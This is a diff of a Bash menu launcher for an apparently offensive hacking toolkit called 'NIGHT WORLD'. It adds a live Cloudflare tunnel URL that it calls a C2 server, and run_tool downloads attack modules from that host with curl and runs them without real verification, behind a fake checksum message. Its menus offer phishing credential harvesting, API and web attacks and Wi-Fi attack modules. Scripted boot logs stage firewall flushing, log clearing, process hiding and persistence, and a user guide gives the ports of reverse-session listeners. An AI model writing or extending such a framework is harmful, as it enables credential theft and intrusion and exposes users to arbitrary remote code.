@@ -2,15 +2,13 @@
 # ============================================
 #   N I G H T   W O R L D
 #   Version: 2.0 (Public)
-#   Engine : 5.0 (Device Responsive)
+#   Engine : 5.0 (Stealth Installer & ASCII)
 #   By bogor x ploit
 # ============================================
 
 VERSION="2.0"
-
-# --- GANTI URL INI PAKAI LINK CLOUDFLARE/NGROK TUAN ---
-MODULE_URL="https://LINK_CLOUDFLARE_TUAN_DISINI" 
-# ------------------------------------------------------
+MODULE_URL="https://rounds-tenant-silver-birth.trycloudflare.com" # <--- GANTI INI
+source ./bxp_core.sh
 
 C='\033[0;36m'; B='\033[0;34m'; W='\033[1;37m'; R='\033[0;31m'; Y='\033[1;33m'; G='\033[0;32m'; N='\033[0m'
 
@@ -43,9 +41,38 @@ detect_env() {
     COLS="$(tput cols 2>/dev/null || echo 80)"
 }
 
-# ---------- ASCII PC (Keris) ----------
-ascii_pc() {
-    cat <<'ASCII'
+# --- ASCII Header (Kecil) ---
+ascii_mobile() { cat <<'ASCII'
+         /\
+        /  \
+       |    |
+       | || |
+       | || |
+       | || |
+    ___|_||_|___
+   \    ||     /
+    \   ||    /
+     \__||__ /
+        ||
+        ||
+     .--||--.
+    /   ||   \
+   |  _ || _  |
+   | / \||/ \ |
+   |/  -||-  \|
+   |\  _||_  /|
+    \  '||'  /
+     '. || .'
+        ||
+        ||
+        ||
+        |/
+   NIGHT WORLD
+ By bogor x ploit
+      v2.0
+ASCII
+}
+ascii_pc() { cat <<'ASCII'
                     /\
                    /   \
                   /     \
@@ -53,15 +80,10 @@ ascii_pc() {
                  |   ||  |
                  |   ||  |
                  |   ||  |
-                 |   ||  |
-                 |   ||  |
-                 |   ||  |
-                 |   ||  |
     ____________|    ||    |____________
    \          __     ||     __        /
     \   .----'    \  ||  /   `----.  /
      \/            \_||_/           \/
-                     ||
                      ||
          .---.-'     ||     '-.----.
       .-'  /         ||         \     `-.
@@ -89,41 +111,7 @@ ascii_pc() {
                      ||
                      ||
                      ||
-                     ||
                      |/
-ASCII
-}
-
-# ---------- ASCII Mobile (Compact) ----------
-ascii_mobile() {
-    cat <<'ASCII'
-         /\
-        /  \
-       |    |
-       | || |
-       | || |
-       | || |
-    ___|_||_|___
-   \   ||     /
-    \  ||    /
-     \_||__ /
-        ||
-        ||
-     .--||--.
-    /   ||   \
-   |  _ || _  |
-   | / \||/ \ |
-   |/  -||-  \|
-   |\  _||_  /|
-    \  '||'  /
-     '. || .'
-       ||
-       ||
-       ||
-       |/
-   NIGHT WORLD
- By bogor x ploit
-      v2.0
 ASCII
 }
 
@@ -150,6 +138,59 @@ show_menu() {
     echo -e "${C}--------------------------------------------------${N}"
 }
 
+# --- Menu Cyber Kill Chain (Menu 1) ---
+menu_kill_chain() {
+    while true; do
+        clear
+        echo -e "${C}--------------------------------------------------${N}"
+        echo -e "${W}  TOOLS HUB ${C}|${W} Cyber Kill Chain${N}"
+        echo -e "${C}--------------------------------------------------${N}"
+        echo -e "${G}  # CYBER MODULE #${N}"
+        echo -e "  ${W}[1]${N} Cyber Attack (API/Web)"
+        echo -e "  ${W}[2]${N} Phising (Credential Harvester)"
+        echo -e "  ${W}[3]${N} Back to Main Menu"
+        echo -e "${C}--------------------------------------------------${N}"
+        echo -ne "${Y}  Select menu > ${N}"
+        read -r kc_choice
+
+        case "$kc_choice" in
+            1) run_tool "CYBER ATTACK" "cyber_attack.sh" ;;
+            2) run_tool "PHISING" "phising.sh" ;;
+            3) return ;;
+            *) echo -e "${R}[!] Invalid choice.${N}"; sleep 1 ;;
+        esac
+    done
+}
+
+# --- Menu Netscan (Menu 3) ---
+menu_netscan() {
+    while true; do
+        clear
+        echo -e "${C}--------------------------------------------------${N}"
+        echo -e "${W}  TOOLS HUB ${C}|${W} Netscan (Wi-Fi)${N}"
+        echo -e "${C}--------------------------------------------------${N}"
+        echo -e "${G}  # WI-FI ATTACK MODULE #${N}"
+        echo -e "  ${W}[1]${N} Exhume Disguise"
+        echo -e "  ${W}[2]${N} Choke The Hunters"
+        echo -e "  ${W}[3]${N} Reclaim Catch In Mid-Air"
+        echo -e "  ${W}[4]${N} Ouija Magnifying Glass"
+        echo -e "  ${W}[5]${N} Back to Main Menu"
+        echo -e "${C}--------------------------------------------------${N}"
+        echo -ne "${Y}  Select menu > ${N}"
+        read -r ns_choice
+
+        case "$ns_choice" in
+            1) run_tool "EXHUME DISGUISE" "exhume_disguise.sh" ;;
+            2) run_tool "CHOKE THE HUNTERS" "choke_hunters.sh" ;;
+            3) run_tool "RECLAIM CATCH" "reclaim_catch.sh" ;;
+            4) run_tool "OUIJA MAGNIFYING" "ouija_magnifying.sh" ;;
+            5) return ;;
+            *) echo -e "${R}[!] Invalid choice.${N}"; sleep 1 ;;
+        esac
+    done
+}
+
+# --- Menu Exploitation (Menu 2) ---
 menu_exploit() {
     while true; do
         clear
@@ -175,22 +216,18 @@ menu_exploit() {
     done
 }
 
+# --- Fungsi Run Tool (1x Install & Super Long Boot) ---
 run_tool() {
-    TOOL_NAME="$1"
-    FILE_NAME="$2"
-    clear
-
-    echo -e "${C}--------------------------------------------------${N}"
-    echo -e "${W}                 $TOOL_NAME${N}"
-    echo -e "${W}             By Bogor X Ploit${N}"
-    echo -e "${C}--------------------------------------------------${N}"
-    echo ""
-
+    TOOL_NAME="$1"; FILE_NAME="$2"; clear
+    
+    # Cek apakah udah ke-install (File ada)
     if [ -f "$FILE_NAME" ]; then
-        echo -e "${G}[+] Module $TOOL_NAME found in local cache.${N}"
-        echo -e "${Y}[*] Booting up...${N}"
+        echo -e "${G}[+] Module $TOOL_NAME already installed. Booting up...${N}"
         sleep 1
     else
+        # Kalau belum ada, tanya install
+        bxp_ascii_title "$TOOL_NAME"
+        echo -e "${C}--------------------------------------------------${N}"
         echo -ne "${Y}[?] Do you want to install $TOOL_NAME module? (Y/N) > ${N}"
         read -r confirm
         
@@ -199,118 +236,152 @@ run_tool() {
         fi
 
         echo ""
-        echo -e "${G}[*] Downloading $FILE_NAME from C2 server...${N}"
+        echo -e "${G}[*] Downloading module from C2 server...${N}"
         DOWNLOAD_URL="${MODULE_URL}/$FILE_NAME" 
         curl -s -o "$FILE_NAME" "$DOWNLOAD_URL"
-        
         if [[ ! -f "$FILE_NAME" ]] || ! head -n 1 "$FILE_NAME" | grep -q "#!/usr/bin/env bash"; then
             echo -e "${R}[-] CRITICAL: Download failed or invalid script format!${N}"
-            echo -e "${Y}[!] The server might have returned a 404 HTML page.${N}"
-            rm -f "$FILE_NAME" 
-            sleep 2; return
+            rm -f "$FILE_NAME"; sleep 2; return
         fi
         echo -e "${G}[*] Verifying checksum (SHA-256)...${N}"; sleep 0.8
     fi
 
+    # Animasi Loading Install
     echo ""
     echo -ne "${Y}Installing... [${N}"
     for i in {1..30}; do echo -ne "${W}=${N}"; sleep 0.05; done
     echo -e "${Y}] 100%${N}"; echo ""
+    
+    clear
+    bxp_ascii_title "$TOOL_NAME"
     echo -e "${C}==================================================${N}"
     
+    # --- BOOT SEQUENCE BERDASARKAN ROOT / NON ROOT ---
     BOOT_LOGS=()
-    if [ "$IS_TERMUX" -eq 1 ]; then
+    if [ "$ROOT_STATUS" = "Root" ] || [ "$ROOT_STATUS" = "Root (su available)" ]; then
+        # Log buat PC / Root
         BOOT_LOGS+=(
-            "[    0.000000] Android Kernel Version: $KERNEL"
-            "[    0.015000] Architecture: $CPU_ABI"
-            "[    0.032000] Device Model: $DEV_MODEL"
-            "[    0.120000] Loading Termux environment ($PREFIX)..."
-            "[    0.240000] Initializing Dalvik Virtual Machine (Android $ANDROID_VER)..."
-            "[    0.350000] ART runtime optimization enabled."
-            "[    0.460000] Mounting /data/data/com.termux/files/usr..."
+            "[    0.000000] BXP Core Engine loaded successfully."
+            "[    0.012000] Root access granted. Privilege escalation active."
+            "[    0.045000] Mounting system partitions (rw)..."
+            "[    0.089000] [ OK ] Partitions mounted."
+            "[    0.120000] Loading kernel modules (bxp_hook.ko)..."
+            "[    0.156000] [ OK ] Module loaded."
+            "[    0.189000] Initializing native network stack..."
+            "[    0.210000] [ OK ] Stack active."
+            "[    0.245000] Bypassing local firewall (iptables)..."
+            "[    0.278000] [ OK ] Firewall rules flushed."
+            "[    0.312000] Establishing encrypted C2 tunnel (AES-256)..."
+            "[    0.345000] [ OK ] Tunnel active."
+            "[    0.389000] Injecting $TOOL_NAME payload into memory..."
+            "[    0.412000] [ OK ] Injection successful."
+            "[    0.456000] Spawning hidden daemon threads..."
+            "[    0.489000] [ OK ] 16 threads active."
+            "[    0.523000] Routing traffic via proxy chain (Tor)..."
+            "[    0.556000] [ OK ] Circuit established."
+            "[    0.589000] Hiding process tree from system..."
+            "[    0.612000] [ OK ] Process hidden."
+            "[    0.645000] Clearing system logs (/var/log)..."
+            "[    0.678000] [ OK ] Logs cleared."
+            "[    0.712000] Verifying payload integrity..."
+            "[    0.745000] [ OK ] Integrity verified."
+            "[    0.789000] Setting up persistence mechanism (Cron)..."
+            "[    0.812000] [ OK ] Persistence active."
+            "[    0.856000] $TOOL_NAME is now fully operational."
         )
     else
+        # Log buat HP / Non-Root
         BOOT_LOGS+=(
-            "[    0.000000] Linux Kernel Version: $KERNEL"
-            "[    0.015000] Architecture: $ARCH"
-            "[    0.032000] Device Model: $DEV_MODEL"
-            "[    0.120000] Loading $OS_NAME environment..."
-            "[    0.240000] Initializing systemd services..."
-            "[    0.350000] Mounting /proc and /sys..."
-            "[    0.460000] Loading kernel modules..."
+            "[    0.000000] BXP Core Engine loaded (User-space)."
+            "[    0.015000] Android Sandbox detected."
+            "[    0.032000] Initializing Dalvik Virtual Machine..."
+            "[    0.056000] [ OK ] VM ready."
+            "[    0.089000] Mounting local storage (Scoped)..."
+            "[    0.120000] [ OK ] Storage mapped."
+            "[    0.156000] Bypassing Termux restrictions..."
+            "[    0.189000] [ OK ] Bypass successful."
+            "[    0.210000] Initializing native network stack..."
+            "[    0.245000] [ OK ] Stack active."
+            "[    0.278000] Establishing encrypted C2 tunnel (AES-256)..."
+            "[    0.312000] [ OK ] Tunnel active."
+            "[    0.345000] Injecting $TOOL_NAME payload into user-space..."
+            "[    0.389000] [ OK ] Injection successful."
+            "[    0.412000] Spawning background services..."
+            "[    0.456000] [ OK ] Services active."
+            "[    0.489000] Routing traffic via proxy chain (Tor)..."
+            "[    0.523000] [ OK ] Circuit established."
+            "[    0.556000] Hiding app icon from launcher..."
+            "[    0.589000] [ OK ] Icon hidden."
+            "[    0.612000] Clearing Termux logs..."
+            "[    0.645000] [ OK ] Logs cleared."
+            "[    0.678000] Verifying payload integrity..."
+            "[    0.712000] [ OK ] Integrity verified."
+            "[    0.745000] Setting up persistence (~/.bashrc)..."
+            "[    0.789000] [ OK ] Persistence active."
+            "[    0.812000] $TOOL_NAME is now fully operational."
         )
     fi
 
-    BOOT_LOGS+=(
-        "[    0.580000] [ INFO ] Extracting $FILE_NAME..."
-        "[    0.690000] [ OK ] Module loaded."
-        "[    0.810000] [ INFO ] Initializing Engine..."
-        "[    0.920000] [ OK ] Engine ready."
-        "[    1.050000] [ INFO ] Bypassing WAF..."
-        "[    1.150000] [ OK ] WAF bypass successful."
-        "[    1.260000] [ INFO ] Spawning background daemon..."
-        "[    1.380000] [ OK ] Daemon active."
-        "[    1.490000] [ INFO ] Establishing C2 channel..."
-        "[    1.600000] [ OK ] Channel encrypted (AES-256)."
-        "[    1.710000] [ INFO ] Hiding process tree..."
-        "[    1.830000] [ OK ] Process hidden."
-        "[    1.940000] [ INFO ] Clearing logs..."
-        "[    2.050000] [ OK ] Logs cleared."
-        "[    2.160000] [ INFO ] Routing via proxy chain..."
-        "[    2.280000] [ OK ] Tor circuit established."
-        "[    2.390000] [ INFO ] Verifying connection..."
-        "[    2.500000] [ OK ] Connection stable."
-        "[    2.610000] [ INFO ] Setting up fallback C2..."
-        "[    2.730000] [ OK ] Fallback ready."
-        "[    2.840000] [ INFO ] Registering session ID..."
-        "[    2.950000] [ OK ] Session ID: 0x$RANDOM$RANDOM."
-        "[    3.060000] [ INFO ] Activating stealth mode..."
-        "[    3.170000] [ OK ] Stealth mode active."
-        "[    3.280000] [ OK ] $TOOL_NAME is now fully operational."
-    )
-
+    # Jeda lebih lama biar dramatis
     for log in "${BOOT_LOGS[@]}"; do
-        echo -e "${W}  $log${N}"
-        sleep 0.15
+        echo -e "${W}  $log${N}"; sleep 0.25
     done
-
+    
     echo -e "${C}==================================================${N}"
     echo -e "${G}[+] Tools complete 100%. Entering $TOOL_NAME...${N}"
     sleep 1.5
-    
     clear
     chmod +x "$FILE_NAME"
     bash "$FILE_NAME"
-    
     echo ""
     read -p "Press Enter to return to menu..."
 }
 
+# --- User Guide (English & Stealth) ---
+user_guide() {
+    clear
+    echo -e "${C}==================================================${N}"
+    echo -e "${W}               USER GUIDE / MANUAL${N}"
+    echo -e "${W}               NIGHT WORLD v2.0${N}"
+    echo -e "${C}==================================================${N}"
+    echo ""
+    echo -e "${Y}[1] INSTALLATION PROCESS${N}"
+    echo -e "  - Select a category (Cyber / Exploit / Netscan)."
+    echo -e "  - Choose the desired module."
+    echo -e "  - Type 'Y' when prompted to install (only required once)."
+    echo -e "  - Wait for the download and boot sequence to complete."
+    echo ""
+    echo -e "${Y}[2] USING THE LISTENERS${N}"
+    echo -e "  - For Session Hooks (NYCTOPHOBIA), the listener port is 2010."
+    echo -e "  - For Session Bridges (SLEEP PARALYSIS), the listener port is 2015."
+    echo -e "  - Ensure these ports are not used by other applications."
+    echo ""
+    echo -e "${Y}[3] TIPS & TRICKS${N}"
+    echo -e "  - Use a VPN/Proxy when conducting tests."
+    echo -e "  - Do not close the terminal while a listener is running."
+    echo -e "  - Press CTRL+C to stop the listener safely."
+    echo ""
+    echo -e "${C}--------------------------------------------------${N}"
+    read -p "Press Enter to return to main menu..."
+}
+
+# --- Main Logic ---
 main() {
     detect_env
     while true; do
         clear
-        # Responsive ASCII (Berdasarkan Device)
-        if [ "$IS_TERMUX" -eq 1 ]; then
-            echo -e "${B}"
-            ascii_mobile
-            echo -e "${N}"
-        else
-            echo -e "${B}"
-            ascii_pc
-            echo -e "${N}"
-        fi
-        
+        if [ "$IS_TERMUX" -eq 1 ]; then echo -e "${B}"; ascii_mobile; echo -e "${N}"
+        else echo -e "${B}"; ascii_pc; echo -e "${N}"; fi
         show_banner
         show_menu
         echo -ne "${Y}  Select menu > ${N}"
         read -r pilihan
 
         case "$pilihan" in
-            1) clear; echo -e "${C}  [Cyber Kill Chain] - Coming soon${N}"; sleep 1 ;;
+            1) menu_kill_chain ;;
             2) menu_exploit ;;
-            3) clear; echo -e "${C}  [Netscan] - Coming soon${N}"; sleep 1 ;;
-            4) clear; echo -e "${C}  [User Guide] - Coming soon${N}"; sleep 1 ;;
+            3) menu_netscan ;;
+            4) user_guide ;;
             0) echo -e "${G}  Exiting NIGHT WORLD...${N}"; exit 0 ;;
             *) echo -e "${R}  Invalid choice.${N}"; sleep 1 ;;
         esac
